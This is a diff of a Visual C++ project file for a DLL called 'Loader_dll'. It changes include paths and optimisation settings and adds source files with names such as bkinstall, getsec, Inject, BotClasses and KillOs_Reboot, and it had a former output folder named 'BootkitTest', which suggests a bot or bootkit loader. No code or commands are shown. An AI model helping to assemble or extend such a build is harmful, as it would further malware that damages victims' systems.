@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="windows-1251"?>
 <VisualStudioProject
 	ProjectType="Visual C++"
-	Version="9,00"
+	Version="9.00"
 	Name="Loader_dll"
 	ProjectGUID="{73638EAF-FFC4-4A1B-8C26-424069D8AE17}"
 	RootNamespace="Loader_dll"
@@ -41,7 +41,7 @@
 			<Tool
 				Name="VCCLCompilerTool"
 				Optimization="0"
-				AdditionalIncludeDirectories="Source;Modules;..\..\Source\Core"
+				AdditionalIncludeDirectories="Source;Modules;..\..\Source\Core;..\..\Source\Common"
 				PreprocessorDefinitions="WIN32;_DEBUG;_WINDOWS;_USRDLL;LOADER_DLL_EXPORTS"
 				StringPooling="false"
 				MinimalRebuild="true"
@@ -120,12 +120,12 @@
 			/>
 			<Tool
 				Name="VCCLCompilerTool"
-				Optimization="2"
+				Optimization="1"
 				EnableIntrinsicFunctions="true"
-				AdditionalIncludeDirectories="Source;Modules;..\..\Source\Core"
-				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;_USRDLL;LOADER_DLL_EXPORTS"
+				AdditionalIncludeDirectories="Source;Modules;..\..\Source\Core;..\..\Source\Common;..\..\Source\Misc"
+				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;_USRDLL;LOADER_DLL_EXPORTS;"
 				StringPooling="false"
-				MinimalRebuild="true"
+				MinimalRebuild="false"
 				ExceptionHandling="0"
 				BasicRuntimeChecks="0"
 				RuntimeLibrary="0"
@@ -179,7 +179,7 @@
 		</Configuration>
 		<Configuration
 			Name="Release DEBUGCONFIG|Win32"
-			OutputDirectory="..\Bin\BootkitTest"
+			OutputDirectory="$(SolutionDir)Bin\$(ConfigurationName)"
 			IntermediateDirectory="Obj\$(ConfigurationName)"
 			ConfigurationType="2"
 			CharacterSet="2"
@@ -204,8 +204,8 @@
 				Name="VCCLCompilerTool"
 				Optimization="2"
 				EnableIntrinsicFunctions="true"
-				AdditionalIncludeDirectories="Source;Modules;..\..\Source\Core"
-				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;_USRDLL;LOADER_DLL_EXPORTS;DEBUGCONFIG"
+				AdditionalIncludeDirectories="Source;Modules;..\..\Source\Core;..\..\Source\Common"
+				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;_USRDLL;LOADER_DLL_EXPORTS;DEBUGCONFIG;"
 				StringPooling="false"
 				MinimalRebuild="true"
 				ExceptionHandling="0"
@@ -270,6 +270,10 @@
 			UniqueIdentifier="{4FC737F1-C7A5-4376-A066-2A32D752A2FF}"
 			>
 			<File
+				RelativePath=".\bkinstall.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotClasses.cpp"
 				>
 			</File>
@@ -298,11 +302,19 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\CabPacker.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\Config.cpp"
 				>
 			</File>
 			<File
 				RelativePath="..\..\Source\Core\Crypt.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\DbgRpt.cpp"
 				>
 			</File>
 			<File
@@ -318,7 +330,15 @@
 				>
 			</File>
 			<File
+				RelativePath=".\getsec.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\Inject.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Misc\KillOs_Reboot.cpp"
 				>
 			</File>
 			<File
@@ -364,6 +384,10 @@
 			UniqueIdentifier="{93995380-89BD-4b04-88EB-625FBE52EBFB}"
 			>
 			<File
+				RelativePath=".\bkinstall.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotClasses.h"
 				>
 			</File>
@@ -392,11 +416,19 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\CabPacker.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\Config.h"
 				>
 			</File>
 			<File
 				RelativePath="..\..\Source\Core\Crypt.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\DbgRpt.h"
 				>
 			</File>
 			<File
@@ -416,7 +448,15 @@
 				>
 			</File>
 			<File
+				RelativePath=".\getsec.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\Inject.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Misc\KillOs_Reboot.h"
 				>
 			</File>
 			<File
